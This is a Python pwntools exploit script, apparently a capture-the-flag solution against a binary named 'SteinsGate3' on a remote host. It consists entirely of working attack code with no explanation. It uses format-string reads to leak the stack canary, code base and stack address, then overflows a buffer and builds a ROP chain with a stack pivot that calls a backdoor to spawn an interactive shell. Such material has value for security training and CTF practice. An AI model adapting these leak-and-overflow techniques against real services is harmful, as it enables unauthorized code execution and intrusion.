from pwn import *
context.log_level = "debug"
# p = process("./SteinsGate3")
p = remote("118.24.3.214" , 12343)
elf = ELF("./SteinsGate3")
# turn 1
p.sendafter("What's your ID:" , "/bin/sh\n")
p.recvuntil("World line fluctuation ratio:")
p.recv(2)

func_1 = int(p.recvuntil("\n" , drop = True)) & 0xf000
main = 0xddb + func_1

p.sendafter("To seek the truth of the world.\n" , "a" * 0x30 + p32(0x2333))
p.sendafter("Repeater is nature of man.\n" , "%7$p")
result = eval(p.recv(10))
p.sendafter("You found it?\n" , "a" * 0x1c + p32(0x6666) + "a" * 0x10 + p32(result + 0x1234))
p.sendafter("Payment of past debts.\n" , "%11$p")
canary = eval(p.recv(18))
print("canary : " + hex(canary))

payload = "a" * 0x30 + p64(0x2333) + p64(canary) + "b" * 8 + p64(main)[:2]
p.sendafter("To seek the truth of the world.\n" , payload)
# turn 2
p.sendafter("What's your ID:" , "/bin/sh\n")
p.sendafter("To seek the truth of the world.\n" , "a" * 0x30 + p32(0x2333))
p.sendafter("Repeater is nature of man.\n" , "%7$p")
result = eval(p.recv(10))
p.sendafter("You found it?\n" , "a" * 0x1c + p32(0x6666) + "a" * 0x10 + p32(result + 0x1234))
p.sendafter("Payment of past debts.\n" , "%13$p")
codebase = eval(p.recvuntil("World" , drop = True)) & ( (~0xfff) )
print("codebase : " + hex(codebase))
pop_rdi = codebase + 0xe83
leave_ret = codebase + 0xb52
backdoor = codebase + 0xc78
id_addr = codebase + 0x202040
payload = "a" * 0x30 + p64(0x2333) + p64(canary) + p64(id_addr) + p64(main)[:2]
p.sendafter("To seek the truth of the world.\n" , payload)
# turn 3 
payload = "/bin/sh\n"
p.sendafter("What's your ID:" , payload)
p.sendafter("To seek the truth of the world.\n" , "a" * 0x30 + p32(0x2333))
p.sendafter("Repeater is nature of man.\n" , "%7$p")
result = eval(p.recv(10))
p.sendafter("You found it?\n" , "a" * 0x1c + p32(0x6666) + "a" * 0x10 + p32(result + 0x1234))
p.sendafter("Payment of past debts.\n" , "%12$p")
stack_rbp = eval(p.recvuntil("World" , drop = True)) 
buf = stack_rbp - 0x40
log.success("rbp : " + hex(stack_rbp))
log.success("buf : " + hex(buf))
payload = p64(buf) + p64(pop_rdi) + p64(id_addr) + p64(backdoor) + "a" * 0x10 + p64(0x2333) + p64(canary) + p64(buf-0x30) + p64(leave_ret)[:2] # gdb get [buf - 0x30]
p.sendafter("To seek the truth of the world.\n" , payload)
p.interactive()